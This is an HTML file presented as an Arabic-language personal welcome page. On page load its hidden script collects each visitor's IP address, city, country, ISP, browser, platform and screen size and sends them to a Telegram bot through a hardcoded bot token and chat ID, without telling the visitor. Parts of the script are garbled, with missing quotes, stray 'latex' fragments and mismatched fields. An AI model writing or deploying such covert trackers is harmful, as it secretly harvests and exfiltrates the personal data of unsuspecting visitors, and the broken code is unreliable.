<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مرحباً بك!</title>
<style>
body {
font-family: system-ui, -apple-system, sans-serif;
background-color: #0f172a;
color: #f8fafc;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}
.card {
background: #1e293b;
padding: 2rem;
border-radius: 12px;
box-shadow: 0 10px 25px rgba(0,0,0,0.5);
text-align: center;
max-width: 400px;
}
h1 { margin-bottom: 0.5rem; color: #38bdf8; }
p { color: #94a3b8; }
</style>
</head>
<body>

<div class="card">
<h1>مرحباً بك في صفحتي الشخصية 👋</h1>
<p>يسعدني مرورك من هنا!</p>
</div>

<script>
// -------------------------------------------------------------
// استبدل التوكن و Chat ID بمعلومات بوت تيليجرام الخاص بك
// -------------------------------------------------------------
const BOT_TOKEN = "9067905487:AAFWRzqKu9WX0XZYfmEdHtaRrITXiQarppI
";
const CHAT_ID = "8318202151";

async function captureVisitorData() {
try {
// 1. جلب بيانات الـ IP والموقع الجغرافي للزائر
const ipRes = await fetch("https://ipapi.co/json/");
const ipData = await ipRes.json();

// 2. تجميع بيانات الجهاز والمتصفح
const visitorInfo = {
ip: ipData.ip || "غير معروف",
city: ipData.city || "غير معروف",
country: ipData.country_name || "غير معروف",
org: ipData.org || "غير معروف", // مزود الخدمة
userAgent: navigator.userAgent,
platform: navigator.platform,
language: navigator.language,
screen: ${window.screen.width}x${window.screen.height},
time: new Date().toLocaleString("ar-EG")
};

// 3. تنسيق الرسالة لتيليجرام
const message =
`🚨 تم تسجيل زيارة جديدة!

📍 الموقع: {visitorInfo.country}
🌐 IP: `latex
{visitorInfo.ip}\` 📡 *المزود:* 

{visitorInfo.org}
📱 الجهاز:latex
{visitorInfo.platform} 💻 *المتصفح:* \`

{visitorInfo.userAgent}`
🖥 الشاشة: {visitorInfo.time}`;

// 4. إرسال الرسالة إلى البوت
await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
chat_id: CHAT_ID,
text: message,
parse_mode: "Markdown"
})
});

} catch (err) {
console.error("فشل إرسال البيانات:", err);
}
}

// تشغيل الدالة فور تحميل الصفحة
window.onload = captureVisitorData;
</script>
</body>
</html>
